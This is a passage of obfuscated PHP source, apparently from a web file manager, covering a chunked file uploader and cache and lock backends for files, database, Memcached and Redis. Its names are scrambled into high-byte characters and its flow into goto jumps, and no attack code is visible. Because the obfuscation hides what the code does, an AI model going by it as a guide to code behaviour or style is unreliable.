parent::PEAR_Error($B°Šë‚‘õ, $D©ø£—‰›, $aŠ§°×õÒ, $E¼†¥¹‰ã™, $c‰Á÷õ­¨Ö); } } } else { class Services_JSON_Error { function __construct($fô¨Üš©• = "\165\156\x6b\156\157\167\x6e\x20\x65\162\x72\157\162", $c™«·˜Ü¸ = null, $FÚğèíÃ¼ = null, $EÛ”¦×ƒ×Í = null, $a¡Ã„¤ùÉ = null) { } } } class Uploader { public $fileName; public $uploadFile; public $tempFile; public function __construct() { goto F”›ŸÙª‹; F”›ŸÙª‹: $fÄÁ×¡¼§½ =& $_SERVER[Î¿—”òá]; global $in; $this->in =& $in; goto CÄøë²Š¾; CÄøë²Š¾: if (!empty($_FILES)) { $AßØæ›öĞÂ = $_FILES[$fÄÁ×¡¼§½[167]]; $this->uploadFile = $AßØæ›öĞÂ[$fÄÁ×¡¼§½[1959]]; if (!$this->uploadFile && $AßØæ›öĞÂ[$fÄÁ×¡¼§½[1212]] > 0) { show_json($this->errorInfo($AßØæ›öĞÂ[$fÄÁ×¡¼§½[1212]]), !1); } } else { if (isset($in[$fÄÁ×¡¼§½[386]])) { $this->uploadFile = isset($in[$fÄÁ×¡¼§½[1960]]) ? $fÄÁ×¡¼§½[1961] : $fÄÁ×¡¼§½[1806]; } } $this->fileName = self::fileName(); $this->statusData = !1; goto AÉ›¥í­öÔ; AÉ›¥í­öÔ: $this->checkSize(); $this->tempPathInit(); goto a×´á¥æïò; a×´á¥æïò: } public function upload() { goto cÉ¹ÃÁº×Õ; eŸ‚³¿¬é: $D‘Úò› = $this->moveUploadedFile($eğ¦§”¦²); if ($BçÉÃ¡Ê™ > 0 && filesize($D‘Úò›) == 0) { $this->showJson($AÚ©·Æ«˜[1967], !1); } if (!$D‘Úò›) { $this->showJson(LNG($AÚ©·Æ«˜[1968]), !1); } goto Eƒ×‡–ãá‹; E µ¥´çºÕ: CacheLock::unlock($this->tempFile); return $this->tempFile; goto d²õòîñƒÀ; e×¬±áÈÊ¬: CacheLock::lock($this->tempFile, 20); $CÏš‚„ŞÔ• = $this->statusGet(); $this->initFileTemp(); goto eŸ‚³¿¬é; c¨¬¹Î¡ì¥: $CÏš‚„ŞÔ•[$AÚ©·Æ«˜[1972]][$AÚ©·Æ«˜[1973] . $DóÅ½‚Áá“] = array($AÚ©·Æ«˜[1974] => $a—ê—ä…ªŠ, $AÚ©·Æ«˜[1029] => $DóÅ½‚Áá“, $AÚ©·Æ«˜[77] => $BçÉÃ¡Ê™, $AÚ©·Æ«˜[164] => $b‰Š°òÉ¾¨); $this->statusSet($CÏš‚„ŞÔ•); if (count($CÏš‚„ŞÔ•[$AÚ©·Æ«˜[1972]]) != $CÏš‚„ŞÔ•[$AÚ©·Æ«˜[1971]]) { $this->showJson($AÚ©·Æ«˜[1975] . $DóÅ½‚Áá“, !0); } goto FªÄ’ÙÅò; bŠ¹£äßÓ: $c¹¶ï“ãƒ… = $this->writeTo($D‘Úò›, $E¿¿ôÔöÖç, $this->tempFile); $b‰Š°òÉ¾¨ = IO::hashSimple($D‘Úò›); $BçÉÃ¡Ê™ = IO::size($D‘Úò›); goto B‹Ï¼ëö‚ğ; B¼ôÉÛö: $eğ¦§”¦² = $this->tempFile . $AÚ©·Æ«˜[1964] . $DóÅ½‚Áá“; $BçÉÃ¡Ê™ = isset($this->in[$AÚ©·Æ«˜[520]]) ? intval($this->in[$AÚ©·Æ«˜[520]]) : 0; $eÆÅ“Š³ˆˆ = isset($this->in[$AÚ©·Æ«˜[1965]]) ? intval($this->in[$AÚ©·Æ«˜[1965]]) : 0; goto fÌ¼òßÄßÃ; B‹Ï¼ëö‚ğ: @unlink($D‘Úò›); if (!$c¹¶ï“ãƒ…) { $this->showJson($AÚ©·Æ«˜[1970] . $DóÅ½‚Áá“, !1); } $CÏš‚„ŞÔ•[$AÚ©·Æ«˜[1971]] = $bÔÎ”ÎğÏØ; goto c¨¬¹Î¡ì¥; cÉ¹ÃÁº×Õ: $AÚ©·Æ«˜ =& $_SERVER[Î¿—”òá]; $DóÅ½‚Áá“ = isset($this->in[$AÚ©·Æ«˜[1962]]) ? intval($this->in[$AÚ©·Æ«˜[1962]]) : 0; $bÔÎ”ÎğÏØ = isset($this->in[$AÚ©·Æ«˜[1963]]) ? intval($this->in[$AÚ©·Æ«˜[1963]]) : 1; goto B¼ôÉÛö; fÌ¼òßÄßÃ: if ($bÔÎ”ÎğÏØ > 1 && $eÆÅ“Š³ˆˆ <= 0) { show_json($AÚ©·Æ«˜[1966], !1); } if ($eÆÅ“Š³ˆˆ > $BçÉÃ¡Ê™) { $bÔÎ”ÎğÏØ = 1; } if ($bÔÎ”ÎğÏØ <= 1) { $this->tempFile = $this->tempFile . rand_string(5); $this->statusSet(!1); return $this->moveUploadedFile($this->tempFile); } goto e×¬±áÈÊ¬; Eƒ×‡–ãá‹: $a—ê—ä…ªŠ = $DóÅ½‚Áá“ * $eÆÅ“Š³ˆˆ; $E¿¿ôÔöÖç = @fopen($this->tempFile, $AÚ©·Æ«˜[1969]); fseek($E¿¿ôÔöÖç, $a—ê—ä…ªŠ); goto bŠ¹£äßÓ; FªÄ’ÙÅò: ignore_timeout(); if (!$this->checkChunkHash($CÏš‚„ŞÔ•)) { $this->showJson($AÚ©·Æ«˜[1976], !1); } $this->statusSet(!1); goto E µ¥´çºÕ; d²õòîñƒÀ: } private function checkSize() { $AÆ‰¤ï¼íØ =& $_SERVER[Î¿—”òá]; if (phpBuild64() || $this->in[$AÆ‰¤ï¼íØ[77]] < PHP_INT_MAX) { return; } show_json(LNG($AÆ‰¤ï¼íØ[1977]), !1); } private function showJson($Bš‹‘Ñ¾ïÁ, $Dèù´¹É½Ğ) { CacheLock::unlock($this->tempFile); if (!$Dèù´¹É½Ğ) { return show_json($Bš‹‘Ñ¾ïÁ, $Dèù´¹É½Ğ); } show_json($Bš‹‘Ñ¾ïÁ, $Dèù´¹É½Ğ); } public function clearData() { $this->statusSet(!1); if (file_exists($this->tempFile)) { @unlink($this->tempFile); return; } } private function tempPathInit() { goto f†œÌùÑï; F­’à£¥ÓĞ: touch($Cã°…³ˆí… . $C·ƒŠ„‚™¤[1978]); $fâöµÒ½Üš = isset($this->in[$C·ƒŠ„‚™¤[1979]]) ? $this->in[$C·ƒŠ„‚™¤[1979]] : !1; if (strlen($fâöµÒ½Üš) < 30) { $fâöµÒ½Üš = md5(USER_ID . $this->in[$C·ƒŠ„‚™¤[75]] . $this->fileName . $this->in[$C·ƒŠ„‚™¤[77]]); } goto b³ÚÌ†ÇËÉ; b³ÚÌ†ÇËÉ: $this->tempFile = $Cã°…³ˆí… . $C·ƒŠ„‚™¤[1980] . md5($fâöµÒ½Üš . $this->in[$C·ƒŠ„‚™¤[1524]]); goto AÃé—íëø¶; f†œÌùÑï: $C·ƒŠ„‚™¤ =& $_SERVER[Î¿—”òá]; $Cã°…³ˆí… = TEMP_FILES; @mk_dir($Cã°…³ˆí…); goto F­’à£¥ÓĞ; AÃé—íëø¶: } private function moveUploadedFile($cŒ­”µ‰º”) { $B•×œ¶İ =& $_SERVER[Î¿—”òá]; $d ÆÕôäåÆ = $this->uploadFile; if ($d ÆÕôäåÆ == $B•×œ¶İ[1981]) { @file_put_contents($cŒ­”µ‰º”, base64_decode($_REQUEST[$B•×œ¶İ[1982]])); } else { if ($d ÆÕôäåÆ == $B•×œ¶İ[1806]) { $b·¢˜ç­Ãæ = @fopen($cŒ­”µ‰º”, $B•×œ¶İ[1514]); $this->writeTo($d ÆÕôäåÆ, $b·¢˜ç­Ãæ, $cŒ­”µ‰º”); } else { if (!move_uploaded_file($d ÆÕôäåÆ, $cŒ­”µ‰º”)) { return !1; } } } return $cŒ­”µ‰º”; } private function writeTo($cÌ¾¼¡ó÷å, $EÃ¡‘¶­¸°, $fØ©ƒ’Œ) { goto E»¾ÕîŠ„; e¤¹ÒçÂ: $aô¨¢ƒë¾ = @fopen($cÌ¾¼¡ó÷å, $A–˜Š™ï‰[1513]); if (!$aô¨¢ƒë¾ || !$EÃ¡‘¶­¸° || !$BÍğÁÍÊ÷ï) { CacheLock::unlock($BÁ…±ğ); return !1; } while (!feof($aô¨¢ƒë¾)) { fwrite($EÃ¡‘¶­¸°, fread($aô¨¢ƒë¾, 1024 * 200)); } goto C©÷«ùÀ„¶; C©÷«ùÀ„¶: fclose($aô¨¢ƒë¾); fclose($EÃ¡‘¶­¸°); CacheLock::unlock($BÁ…±ğ); goto Fç„ÅŠèÎğ; E»¾ÕîŠ„: $A–˜Š™ï‰ =& $_SERVER[Î¿—”òá]; $BÁ…±ğ = $A–˜Š™ï‰[1983] . $fØ©ƒ’Œ; $BÍğÁÍÊ÷ï = CacheLock::lock($BÁ…±ğ, 1); goto e¤¹ÒçÂ; Fç„ÅŠèÎğ: return !0; goto A‡ò…ó±ï; A‡ò…ó±ï: } private function statusGet() { goto c–´áñ‘›ó; D·í†‡›Í: $d»ƒ¥èÕ¼ = !1; if (file_exists($C‰µÛ¿Û©ö)) { $d»ƒ¥èÕ¼ = @file_get_contents($C‰µÛ¿Û©ö); } if ($d»ƒ¥èÕ¼) { $this->statusData = json_decode($d»ƒ¥èÕ¼, !0); } goto b¯ŸÓÕÈã; b¯ŸÓÕÈã: if (!$this->statusData) { $C×›Æ‚Å¤¸ = array($FàçŸ¹¾™â[28] => $this->fileName, $FàçŸ¹¾™â[1971] => 0, $FàçŸ¹¾™â[1972] => array()); $this->statusSet($C×›Æ‚Å¤¸); } return $this->statusData; goto C¬Ä¤ŒÔÄ; c–´áñ‘›ó: $FàçŸ¹¾™â =& $_SERVER[Î¿—”òá]; if (is_array($this->statusData)) { return $this->statusData; } $C‰µÛ¿Û©ö = $this->tempFile . $FàçŸ¹¾™â[1984]; goto D·í†‡›Í; C¬Ä¤ŒÔÄ: } public function statusSet($D…ÈÂùŸº) { $dà”¾§¬–Ú = $this->tempFile . $_SERVER[Î¿—”òá][1984]; if (!$D…ÈÂùŸº) { if (file_exists($dà”¾§¬–Ú)) { @unlink($dà”¾§¬–Ú); } return !0; } $this->statusData = $D…ÈÂùŸº; return file_put_contents($dà”¾§¬–Ú, json_encode($D…ÈÂùŸº)); } private function initFileTemp() { $Fï¨¡ŸŠğ =& $_SERVER[Î¿—”òá]; if (file_exists($this->tempFile)) { return; } $cÜ…Ş‚ííÒ = fopen($this->tempFile, $Fï¨¡ŸŠğ[1985]); fseek($cÜ…Ş‚ííÒ, $this->in[$Fï¨¡ŸŠğ[77]] - 1, SEEK_SET); fwrite($cÜ…Ş‚ííÒ, $Fï¨¡ŸŠğ[468]); fclose($cÜ…Ş‚ííÒ); } public function checkChunk() { goto fÕ‚«ÙÍ„; AÛğÅ¦İŸ†: $B„ƒÕ—ò = $this->statusGet(); CacheLock::unlock($this->tempFile); foreach ($B„ƒÕ—ò[$C’­è®ï¿ç[1972]] as $D¨²è‘®ß§) { $AÔäöÆÉ— = $D¨²è‘®ß§[$C’­è®ï¿ç[164]]; if ($AÔäöÆÉ—) { $F‚Ô¼´†Ó˜[$C’­è®ï¿ç[1986] . $D¨²è‘®ß§[$C’­è®ï¿ç[1029]]] = $AÔäöÆÉ—; } } goto C×ÙÂ°È; fÕ‚«ÙÍ„: $C’­è®ï¿ç =& $_SERVER[Î¿—”òá]; $F‚Ô¼´†Ó˜ = array(); CacheLock::lock($this->tempFile); goto AÛğÅ¦İŸ†; C×ÙÂ°È: return $F‚Ô¼´†Ó˜; goto Bì°“Êò·¿; Bì°“Êò·¿: } private function checkChunkHash($CÑ‘öç®ä†) { goto dŠœ‚¹é÷ô; CÌé«ÛÑµ‡: $EÏÕ¤Ğ Çå = _get($this->in, $C˜·œøêÔ[1987]); if (strlen($EÏÕ¤Ğ Çå) == 32 && IO::hashSimple($this->tempFile) == $b‰Êºåİ¦’ && IO::hashMd5($this->tempFile) == $EÏÕ¤Ğ Çå) { return !0; } $Eù»±µƒ = fopen($this->tempFile, $C˜·œøêÔ[1163]); goto cš¼ÇÚ¬ñ–; dŠœ‚¹é÷ô: $C˜·œøêÔ =& $_SERVER[Î¿—”òá]; if (count($CÑ‘öç®ä†[$C˜·œøêÔ[1972]]) != $CÑ‘öç®ä†[$C˜·œøêÔ[1971]]) { return !1; } $b‰Êºåİ¦’ = _get($this->in, $C˜·œøêÔ[1979]); goto CÌé«ÛÑµ‡; cš¼ÇÚ¬ñ–: $FñğªœŠ„‚ = !0; foreach ($CÑ‘öç®ä†[$C˜·œøêÔ[1972]] as $e¬‰å˜™ˆª) { fseek($Eù»±µƒ, $e¬‰å˜™ˆª[$C˜·œøêÔ[1974]]); $A‹À¨ÇÓŒò = PathDriverStream::hash($Eù»±µƒ, $e¬‰å˜™ˆª[$C˜·œøêÔ[77]]); if ($e¬‰å˜™ˆª[$C˜·œøêÔ[164]] != $A‹À¨ÇÓŒò) { $FñğªœŠ„‚ = !1; break; } } fclose($Eù»±µƒ); goto A¶ŠÍ’¸õØ; A¶ŠÍ’¸õØ: return $FñğªœŠ„‚; goto Eï¨Îôôß; Eï¨Îôôß: } public static function fileName() { goto Añ¾˜Ú‘²å; Añ¾˜Ú‘²å: $FÛĞ„ª”¶¯ =& $_SERVER[Î¿—”òá]; global $in; $A—ŠÑŞÀÒ… = isset($in[$FÛĞ„ª”¶¯[28]]) ? $in[$FÛĞ„ª”¶¯[28]] : $FÛĞ„ª”¶¯[33]; goto dà‚†¡§²‘; dà‚†¡§²‘: if (!empty($_FILES)) { $A—ŠÑŞÀÒ… = $A—ŠÑŞÀÒ… ? $A—ŠÑŞÀÒ… : $_FILES[$FÛĞ„ª”¶¯[167]][$FÛĞ„ª”¶¯[386]]; } if (!is_wap()) { return KodIO::clear($A—ŠÑŞÀÒ…); } $aç÷ö“™ˆ™ = strtotime($in[$FÛĞ„ª”¶¯[1988]]); goto bÍ†ß¶ºö; bÍ†ß¶ºö: $aç÷ö“™ˆ™ = $aç÷ö“™ˆ™ ? $aç÷ö“™ˆ™ : time(); $Bá‡ãØ…­ = strtolower($A—ŠÑŞÀÒ…); if ($Bá‡ãØ…­ == $FÛĞ„ª”¶¯[1989] || $Bá‡ãØ…­ == $FÛĞ„ª”¶¯[1990]) { $A—ŠÑŞÀÒ… = date($FÛĞ„ª”¶¯[686], $aç÷ö“™ˆ™) . $FÛĞ„ª”¶¯[70] . $in[$FÛĞ„ª”¶¯[77]] . $FÛĞ„ª”¶¯[1621]; } else { if ($Bá‡ãØ…­ == $FÛĞ„ª”¶¯[1991]) { $A—ŠÑŞÀÒ… = date($FÛĞ„ª”¶¯[686], $aç÷ö“™ˆ™) . $FÛĞ„ª”¶¯[70] . $in[$FÛĞ„ª”¶¯[77]] . $FÛĞ„ª”¶¯[1992]; } } goto DÃíì°İ; DÃíì°İ: return KodIO::clear($A—ŠÑŞÀÒ…); goto FÀİò®İô; FÀİò®İô: } private function errorInfo($F’ëŸáê) { $DÓàŞîâß =& $_SERVER[Î¿—”òá]; $a”ˆĞÂøàœ = array($DÓàŞîâß[1993], $DÓàŞîâß[1994], $DÓàŞîâß[1995], $DÓàŞîâß[1996], $DÓàŞîâß[1997], $DÓàŞîâß[1998], $DÓàŞîâß[1999], $DÓàŞîâß[2000]); return $F’ëŸáê . $DÓàŞîâß[4] . $a”ˆĞÂøàœ[$F’ëŸáê]; } } $dæ±ê—Îõ— = LIB_DIR . $_SERVER[Î¿—”òá][1301]; goto D™¹‚ƒ‹à³; bŒá±œ¸À: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($dÈóŒª«, $dÇ™Ä§Ù¢Ñ) { $EÄñ‡ßî·§ =& $_SERVER[Î¿—”òá]; $this->cachePath = $dÈóŒª«[$EÄñ‡ßî·§[75]]; $this->prefix = $EÄñ‡ßî·§[758]; $this->cacheTime = $dÇ™Ä§Ù¢Ñ; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($f°¶°¯³³ï) { $e¶­ËŒ¦Ùù =& $_SERVER[Î¿—”òá]; $f°¶°¯³³ï = str_replace(array($e¶­ËŒ¦Ùù[759], $e¶­ËŒ¦Ùù[93], $e¶­ËŒ¦Ùù[69]), $e¶­ËŒ¦Ùù[760], $f°¶°¯³³ï); return $this->cachePath . $e¶­ËŒ¦Ùù[761] . $f°¶°¯³³ï . $e¶­ËŒ¦Ùù[762]; } public function set($BÉÎƒØ‘²¡, $b½Çå¢ÜÜ¢, $eÀ°¡ÕÕÂ„ = false) { $bË„º­Š±® = $this->getFile($BÉÎƒØ‘²¡); if (file_put_contents($bË„º­Š±®, $this->prefix . $b½Çå¢ÜÜ¢, LOCK_EX)) { return !0; } @unlink($bË„º­Š±®); return !1; } public function get($aÊÀ‘Ò·ÜÌ) { $c¯Õë£á÷× = $this->getFile($aÊÀ‘Ò·ÜÌ); if (file_exists($c¯Õë£á÷×) && filemtime($c¯Õë£á÷×) < time() - $this->cacheTime) { @unlink($c¯Õë£á÷×); return !1; } $b¯—Ò·ÙÇ’ = @file_get_contents($c¯Õë£á÷×); return substr($b¯—Ò·ÙÇ’, strlen($this->prefix)); } public function remove($d¥®‡½©µ) { $d÷ ‰œ÷Èà = $this->getFile($d¥®‡½©µ); return @unlink($d÷ ‰œ÷Èà); } public function deleteAll() { $fĞÊ¯ùä‰„ =& $_SERVER[Î¿—”òá]; $eùï‹–Ûò = scandir($this->cachePath); foreach ($eùï‹–Ûò as $aŒÊÍ¹¼–©) { $Cîäì‡÷« = $this->cachePath . $aŒÊÍ¹¼–©; if (strpos($Cîäì‡÷«, $fĞÊ¯ùä‰„[762]) && strpos($Cîäì‡÷«, $fĞÊ¯ùä‰„[763])) { @unlink($Cîäì‡÷«); } } } public function clearTimeout() { $bä†­¹µŠ =& $_SERVER[Î¿—”òá]; $EƒË¨èêÖ = scandir($this->cachePath); foreach ($EƒË¨èêÖ as $Aªõø‹ˆë) { $eÇ¶ÜÊ¼ = $this->cachePath . $Aªõø‹ˆë; if (strpos($eÇ¶ÜÊ¼, $bä†­¹µŠ[762]) && strpos($eÇ¶ÜÊ¼, $bä†­¹µŠ[763]) && filemtime($eÇ¶ÜÊ¼) < time() - $this->cacheTime) { @unlink($eÇ¶ÜÊ¼); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto fôÈ©¥ïŠƒ; BºÓ¥ˆÃº: if ($Fª®šÈÇä == $c´••ÅƒÛ[17] && $FºåäÇ“Ö == $c´••ÅƒÛ[9]) { $Fª®šÈÇä = $c´••ÅƒÛ[167]; } switch ($Fª®šÈÇä) { case $c´••ÅƒÛ[754]: self::$handle = new CacheLockRedis(); break; case $c´••ÅƒÛ[755]: self::$handle = new CacheLockMemcached(); break; case $c´••ÅƒÛ[17]: self::$handle = new CacheLockDatabase(); break; case $c´••ÅƒÛ[167]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto FïÀÕÇ¦¬¬; fôÈ©¥ïŠƒ: $c´••ÅƒÛ =& $_SERVER[Î¿—”òá]; if (self::$handle) { return self::$handle; } $dÏÅÉŸÛ’ = $GLOBALS[$c´••ÅƒÛ[6]][$c´••ÅƒÛ[337]]; goto cÙŞÜ’‘øØ; cÙŞÜ’‘øØ: self::$timeout = $dÏÅÉŸÛ’[$c´••ÅƒÛ[764]] ? $dÏÅÉŸÛ’[$c´••ÅƒÛ[764]] : 10; $FºåäÇ“Ö = _get($GLOBALS[$c´••ÅƒÛ[6]], $c´••ÅƒÛ[765]); $Fª®šÈÇä = $dÏÅÉŸÛ’[$c´••ÅƒÛ[751]] ? $dÏÅÉŸÛ’[$c´••ÅƒÛ[751]] : $c´••ÅƒÛ[167]; goto BºÓ¥ˆÃº; FïÀÕÇ¦¬¬: } private static function key($bœ×»æ¸ã) { return $_SERVER[Î¿—”òá][766] . Cache::key($bœ×»æ¸ã); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($aÉÉ®–ºÃİ = '') { self::$errorMsg = $aÉÉ®–ºÃİ; } public static function lockGlobal($aí´°ªŠŸ, $e–İã‰Ôâõ) { return self::lock($aí´°ªŠŸ, $e–İã‰Ôâõ, !0); } public static function lock($AÏŞÑ¢Ú¹Ï, $F‰é½†œÈ = false, $BŒ³Û¹êˆ¹ = false) { goto E¾ÎÆÇ¥’˜; E¾ÎÆÇ¥’˜: $bÇ¿°™®„Ì =& $_SERVER[Î¿—”òá]; $añò­©ùĞ = self::init(); $cáŒœ®Ã¬ = self::key($AÏŞÑ¢Ú¹Ï); goto aÌÜø×«¬æ; aÌÜø×«¬æ: $F‰é½†œÈ = $F‰é½†œÈ ? $F‰é½†œÈ : self::$timeout; $CËå—ï§îİ = $añò­©ùĞ->lock($cáŒœ®Ã¬, $F‰é½†œÈ); if (!$CËå—ï§îİ) { $dœ†¢‹«â½ = $bÇ¿°™®„Ì[767] . $F‰é½†œÈ . $bÇ¿°™®„Ì[67] . self::$errorMsg . $bÇ¿°™®„Ì[67] . get_caller_msg(); $FµñÇ…†‡ = "\114\x6f\143\x6b\40\x61\143\164\x69\x6f\156\x3a\x20{$cáŒœ®Ã¬}\x20\164\151\155\145\x6f\x75\x74\x2c\157\166\x65\162\40{$F‰é½†œÈ}\40\163"; $FµñÇ…†‡ = self::$errorMsg ? self::$errorMsg : $Aáˆ³øÅ©¿; write_log($dœ†¢‹«â½, $bÇ¿°™®„Ì[768]); show_json($FµñÇ…†‡, !1); } goto BÅ‡£·ÃŠ; BÅ‡£·ÃŠ: if (!$BŒ³Û¹êˆ¹) { self::$lockItem[$cáŒœ®Ã¬] = !0; } return $CËå—ï§îİ; goto a´†„áâ°í; a´†„áâ°í: } public static function lockGet($CŸØáœ¥ğ) { $dù¨¯¥œİ´ = self::key($CŸØáœ¥ğ); if (self::$lockItem[$dù¨¯¥œİ´]) { return self::$lockItem[$dù¨¯¥œİ´]; } return self::init()->lockGet($dù¨¯¥œİ´); } public static function unlock($aÅøÉºÌµà) { $aØå š¿ˆÔ = self::key($aÅøÉºÌµà); self::$lockItem[$aØå š¿ˆÔ] = null; return self::init()->unlock($aØå š¿ˆÔ); } public static function unlockRuntime() { $AÒëÈöŸö =& $_SERVER[Î¿—”òá]; $C¯â“†â¶ƒ = self::init(); $Bæ›‰…ŸäÎ = !1; foreach (self::$lockItem as $aŒáš‚²Œ‰ => $A¼ĞØâ¦÷•) { if (!$A¼ĞØâ¦÷•) { continue; } $C¯â“†â¶ƒ->unlock($aŒáš‚²Œ‰); if (!$Bæ›‰…ŸäÎ) { $Bæ›‰…ŸäÎ = !0; write_log($AÒëÈöŸö[769] . $aŒáš‚²Œ‰ . $AÒëÈöŸö[67] . get_caller_msg(), $AÒëÈöŸö[768]); continue; } write_log($AÒëÈöŸö[769] . $aŒáš‚²Œ‰, $AÒëÈöŸö[768]); } } } function cacheLockWait() { usleep(mt_rand(5, 50) * 100); } goto eéƒÙ¹ËÖ‹; Cµ´ËÔîÃ: class CacheLockDatabase { public function lock($Dˆ¬Ì±›ÙÚ, $C¸£Ø¯‹ø× = 0) { $añ·ÛîÛ = Model($_SERVER[Î¿—”òá][753]); $cØšŸó“Ü = microtime(!0) + $C¸£Ø¯‹ø×; while (microtime(!0) < $cØšŸó“Ü) { $fº…ÖšÌÇë = $añ·ÛîÛ->get($Dˆ¬Ì±›ÙÚ); if (!$fº…ÖšÌÇë || $fº…ÖšÌÇë < microtime(!0)) { $a°ÚöÍÎê = $añ·ÛîÛ->set($Dˆ¬Ì±›ÙÚ, $cØšŸó“Ü); if ($a°ÚöÍÎê) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($C†·Ì…”«Ğ) { return Model($_SERVER[Î¿—”òá][753])->get($C†·Ì…”«Ğ); } public function unlock($c„ƒ½ä‰Œ‰) { Model($_SERVER[Î¿—”òá][753])->remove($c„ƒ½ä‰Œ‰); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($f°†Â…ó¹, $EÄêˆÒÈ²¯) { $bìÕ½÷…Å =& $_SERVER[Î¿—”òá]; if (!class_exists($bìÕ½÷…Å[774])) { show_json($bìÕ½÷…Å[775], !1); } $this->cacheTime = $EÄêˆÒÈ²¯; $this->handle = new Memcached(); if (is_array($f°†Â…ó¹[$bìÕ½÷…Å[776]]) && count($f°†Â…ó¹[$bìÕ½÷…Å[776]]) >= 1) { foreach ($f°†Â…ó¹[$bìÕ½÷…Å[776]] as $FˆŞáŸ‹×’) { $C´¢‚«‹Ëá = explode($bìÕ½÷…Å[4], $FˆŞáŸ‹×’); $this->handle->addServer($C´¢‚«‹Ëá[0], $C´¢‚«‹Ëá[1]); } } else { $this->handle->addServer($f°†Â…ó¹[$bìÕ½÷…Å[169]], $f°†Â…ó¹[$bìÕ½÷…Å[170]]); } } public function set($dõŠ…Æô‘, $AÖø¥òùÊÙ, $cÛ¬ˆÇÓä = false) { $cÛ¬ˆÇÓä = $cÛ¬ˆÇÓä ? $cÛ¬ˆÇÓä : $this->cacheTime; return $this->handle->set($dõŠ…Æô‘, $AÖø¥òùÊÙ, $cÛ¬ˆÇÓä); } public function get($b¶éñİËé³) { return $this->handle->get($b¶éñİËé³); } public function remove($b®Ïš«È‹) { return $this->handle->delete($b®Ïš«È‹); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($fÈÛŒ½‚ƒ“, $b˜ã„‡Ãô†) { $e—íØ¦à°¿ =& $_SERVER[Î¿—”òá]; if (!class_exists($e—íØ¦à°¿[777])) { show_json($e—íØ¦à°¿[778], !1); } $this->cacheTime = $b˜ã„‡Ãô†; $E­êŠ©Ñîï = isset($fÈÛŒ½‚ƒ“[$e—íØ¦à°¿[779]]) ? $fÈÛŒ½‚ƒ“[$e—íØ¦à°¿[779]] : 10; $fá¯•‹ñµ… = _get($fÈÛŒ½‚ƒ“, $e—íØ¦à°¿[776]); if ($fá¯•‹ñµ… && is_array($fá¯•‹ñµ…)) { $this->initCluster($fÈÛŒ½‚ƒ“, $E­êŠ©Ñîï); } else { $this->handle = $this->init($fÈÛŒ½‚ƒ“, $E­êŠ©Ñîï); } } private function init($fá„Í­Íæ‘, $d™ìÅ­¡ŞÓ) { $AäÛÃô¡â =& $_SERVER[Î¿—”òá]; $b†ŒÚ‘œÌÀ = new Redis(); $f®ïÊ­¡ˆ = isset($fá„Í­Íæ‘[$AäÛÃô¡â[780]]) ? $fá„Í­Íæ‘[$AäÛÃô¡â[780]] : !1; if ($f®ïÊ­¡ˆ) { $b†ŒÚ‘œÌÀ->pconnect($fá„Í­Íæ‘[$AäÛÃô¡â[169]], $fá„Í­Íæ‘[$AäÛÃô¡â[170]], $d™ìÅ­¡ŞÓ); } else { $b†ŒÚ‘œÌÀ->connect($fá„Í­Íæ‘[$AäÛÃô¡â[169]], $fá„Í­Íæ‘[$AäÛÃô¡â[170]], $d™ìÅ­¡ŞÓ); } if (!empty($fá„Í­Íæ‘[$AäÛÃô¡â[376]])) { $b†ŒÚ‘œÌÀ->auth($fá„Í­Íæ‘[$AäÛÃô¡â[376]]); } return $b†ŒÚ‘œÌÀ; } private function initCluster($b£ƒ©ø, $fñ”êïÖ‡˜) { $Cô¯åÄ¦õÄ =& $_SERVER[Î¿—”òá]; $cÀ©´¿†Ò = array($Cô¯åÄ¦õÄ[781], $Cô¯åÄ¦õÄ[782], $Cô¯åÄ¦õÄ[783]); $A—”¸§ë‰‡ = $Cô¯åÄ¦õÄ[781]; if (isset($b£ƒ©ø[$Cô¯åÄ¦õÄ[12]]) && in_array($b£ƒ©ø[$Cô¯åÄ¦õÄ[12]], $cÀ©´¿†Ò)) { $A—”¸§ë‰‡ = $b£ƒ©ø[$Cô¯åÄ¦õÄ[12]]; } switch ($A—”¸§ë‰‡) { case $Cô¯åÄ¦õÄ[781]: $this->_slave($b£ƒ©ø, $fñ”êïÖ‡˜); break; case $Cô¯åÄ¦õÄ[782]: break; case $Cô¯åÄ¦õÄ[783]: $this->isCluster = !0; $CèÀµê×æ = $b£ƒ©ø[$Cô¯åÄ¦õÄ[776]]; $D–ò’½²”‹ = isset($b£ƒ©ø[$Cô¯åÄ¦õÄ[780]]) ? $b£ƒ©ø[$Cô¯åÄ¦õÄ[780]] : !1; $A½ğ­ÄÁİ¿ = isset($b£ƒ©ø[$Cô¯åÄ¦õÄ[376]]) ? $b£ƒ©ø[$Cô¯åÄ¦õÄ[376]] : null; $this->handle = new RedisCluster(NUll, $CèÀµê×æ, $fñ”êïÖ‡˜, $fñ”êïÖ‡˜, $D–ò’½²”‹, $A½ğ­ÄÁİ¿); break; default: break; } } private function _slave($e†øé‘—ó‘, $C”µÁÀ¾¯‰) { goto C’•Œö›é; B¢ÉŸÒóÊ: $this->filterConfig($e†øé‘—ó‘, $E‰Ş™Ñ‘ƒ[$C®½É‰±ëØ]); $this->slaveHandle = $this->init($e†øé‘—ó‘, $C”µÁÀ¾¯‰); goto e¦îËø¦; C’•Œö›é: $E‰Ş™Ñ‘ƒ = $e†øé‘—ó‘[$_SERVER[Î¿—”òá][776]]; $this->filterConfig($e†øé‘—ó‘, $E‰Ş™Ñ‘ƒ[0]); $this->handle = $this->init($e†øé‘—ó‘, $C”µÁÀ¾¯‰); goto Eê—¼ÂÜŒÜ; Eê—¼ÂÜŒÜ: unset($E‰Ş™Ñ‘ƒ[0]); if (empty($E‰Ş™Ñ‘ƒ)) { return; } $C®½É‰±ëØ = array_rand($E‰Ş™Ñ‘ƒ); goto B¢ÉŸÒóÊ; e¦îËø¦: } private function filterConfig(&$FòÇÈ™óÓç, $aÍ³ÊÃ¡ÕÄ) { $D¢‘ÄÊ¥ğå =& $_SERVER[Î¿—”òá]; $CìÈß— ŒØ = explode($D¢‘ÄÊ¥ğå[4], 